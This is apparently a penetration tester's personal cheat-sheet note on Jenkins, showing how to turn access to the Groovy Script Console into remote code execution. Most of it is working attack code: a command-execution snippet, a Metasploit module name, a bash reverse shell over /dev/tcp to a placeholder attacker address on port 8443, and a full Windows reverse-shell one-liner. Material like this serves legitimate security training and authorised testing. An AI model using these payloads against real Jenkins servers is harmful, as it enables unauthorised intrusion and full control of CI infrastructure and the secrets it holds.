---
created: 2026-07-19
tags:
  - web_hacking
status: incomplete
---
## Jenkins

>**[Jenkins](https://www.jenkins.io/)** is a leading open-source automation server written in Java, primarily used to implement **Continuous Integration (CI)** and **Continuous Delivery (CD)** workflows.

- By default, Jenkins web UI runs on Tomcat port `8080`.
- Port `50000` is used by default for communication between the Jenkins master and its agents (slaves).

## RCE via Script Console

- **[Jenkins Script Console](https://www.jenkins.io/doc/book/managing/script-console/)** exposes a [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) shell that allows administrator to execute arbitrary Groovy scripts directly on the Jenkins **controller** (master) or connected **agents**.
- The console can be found at `http://jenkins.example.com:8080/script` (or `Manage Jenkins` in the web UI). 

>[!note] Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

- For example, to run the `id` command:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

- To get a reverse shell, you can use the `exploit/multi/http/jenkins_script_console` Metasploit module:

```bash
use exploit/multi/http/jenkins_script_console
```

- Alternatively, run the following:

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker_ip_address>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Windows reverse shell:

```groovy
String host="<attacker_ip_address>";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References and further reading

- [`Jenkins`](https://www.jenkins.io/)
- [`Jenkins Script Console — Jenkins Documentation`](https://www.jenkins.io/doc/book/managing/script-console/)
- [`Apache Groovy — Wikipedia`](https://en.wikipedia.org/wiki/Apache_Groovy)